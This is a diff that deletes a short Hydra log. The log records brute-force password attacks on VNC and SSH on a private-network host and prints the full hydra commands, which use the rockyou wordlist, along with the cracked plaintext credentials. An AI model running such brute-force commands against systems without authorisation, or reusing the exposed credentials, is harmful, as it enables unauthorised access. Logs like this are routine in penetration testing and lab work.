@@ -1,7 +1,0 @@
-# Hydra v9.5 run at 2024-09-29 10:26:42 on 192.168.1.17 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.17:5900)
-# Hydra v9.5 run at 2024-09-29 10:28:29 on 192.168.1.17 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.17:5900)
-[5900][vnc] host: 192.168.1.17   password: Cmonster2006!@#!@#!@#
-# Hydra v9.5 run at 2024-09-29 10:29:35 on 192.168.1.17 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.17:5900)
-[5900][vnc] host: 192.168.1.17   password: Cmonster2006!@#!@#!@#
-# Hydra v9.5 run at 2024-09-29 10:32:43 on 192.168.1.17 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.17:22)
-[22][ssh] host: 192.168.1.17   login: zero   password: Cmonster2006
